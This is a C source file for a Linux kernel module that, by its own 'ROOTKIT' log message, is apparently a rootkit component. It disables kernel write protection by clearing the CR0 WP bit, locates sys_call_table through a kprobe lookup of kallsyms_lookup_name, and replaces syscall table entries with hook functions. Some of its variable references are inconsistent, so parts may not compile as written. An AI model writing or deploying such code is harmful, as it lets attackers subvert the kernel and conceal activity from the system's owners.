#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include "hook.h"


inline uint64_t get_cr0(void){
  uint64_t ret;
  __asm__ volatile (
    "movq %%cr0, %[ret]"
    : [ret] "=r" (ret)
  );
  return ret;
}

inline void set_cr0(uint64_t cr0){
  __asm__ volatile (
    "movq %[cr0], %%cr0"
    :
    : [cr0] "r" (cr0)
  );
}

inline void set_WP_0(){
  uint64_t cr0 = get_cr0();
  cr0 &= ~WP;
  set_cr0(cr0);
}

inline void set_WP_1(){
  uint64_t cr0 = get_cr0();
  cr0 |= WP;
  set_cr0(cr0);
}

void** get_syscall_table(){
  void** sct;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
  unregister_kprobe(&kp);

  printk(KERN_ALERT "ROOTKIT syscall_table is at %p",syscall_table);
#endif
  sct = (void**)kallsyms_lookup_name("sys_call_table");
  return sct;
}

void hook_syscall(void** sys_fn_old, void* sys_fn_hook, int syscall_id){
  *sys_fn_old = sys_call_table[syscall_id];
  sys_call_table[syscall_id] = sys_fn_hook;
}

void unhook_syscall(void* sys_fn_old, int syscall_id){
  sys_call_table[syscall_id] = sys_fn_old;
}
